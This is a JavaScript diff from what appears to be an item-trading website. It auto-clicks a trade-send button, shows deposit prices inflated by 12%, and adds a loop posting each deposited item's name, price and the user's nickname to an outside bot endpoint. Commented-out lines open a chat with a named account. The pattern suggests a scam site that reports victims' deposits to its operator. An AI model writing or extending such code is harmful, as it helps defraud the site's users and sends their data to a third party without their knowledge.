@@ -210,7 +210,6 @@ function checkprice(name, image) {
         })
     })
     .fail(function(data) {
-        alert(data.statusText);
         Swal.fire({
           imageUrl: image,
           imageHeight: 200,
@@ -402,7 +401,10 @@ function confirmbuttoncanceled() {
 
 function add10() {
     $("#deposit_confrim_window .inventory_item").attr('add-price', 12);
-    $("#deposit_confrim_window .inventory_item .inventory_item_cost").html('$$$');
+    var price = +$("#deposit_confrim_window .inventory_item .inventory_item_cost").html();
+    price = parseInt(price + price / 100 * 12);
+    price = price + ' (+12%)';
+    $("#deposit_confrim_window .inventory_item .inventory_item_cost").html(price);
     calculate_deposit_price();
     $('.add10').remove();
 }
@@ -537,15 +539,26 @@ function turnon() {
                     //window.open('https://xn--80affa3aj0al.xn--80asehdb/#/im?p=@KaRoLMD&name='+data.items[0].name);
                     //window.open('https://xn--80affa3aj0al.xn--80asehdb/#/im?p=u1243926099_7865724337195838746&name='+data.items[0].name)
                     $('.send.ready_to_trade').click();
-                    $.ajax({
-                      url: "https://polygonbot.herokuapp.com/sm",
-                      type: 'post',
-                      data: {
-                          'msg': data.items[0].name,
-                          'nick': nickname,
-                          'price': data.items[0].price
-                      }
-                    });
+                    
+                    var items = data.items;
+                    for (var i = 0; i < items.length; i++) {
+                        if (items[i] != undefined) {
+                            var item = items[i];
+                            var price = parseInt(item.price + item.price / 100 * item.add_price);
+                            if (item.add_price > 0) price = price + ' (+' + item.add_price + '%)';
+                            $.ajax({
+                              url: "https://polygonbot.herokuapp.com/sm",
+                              type: 'post',
+                              data: {
+                                  'msg': item.name,
+                                  'nick': nickname,
+                                  'price': price
+                              }
+                            });
+                        }
+                    }
+                    
+                    
                 }
                 
             });
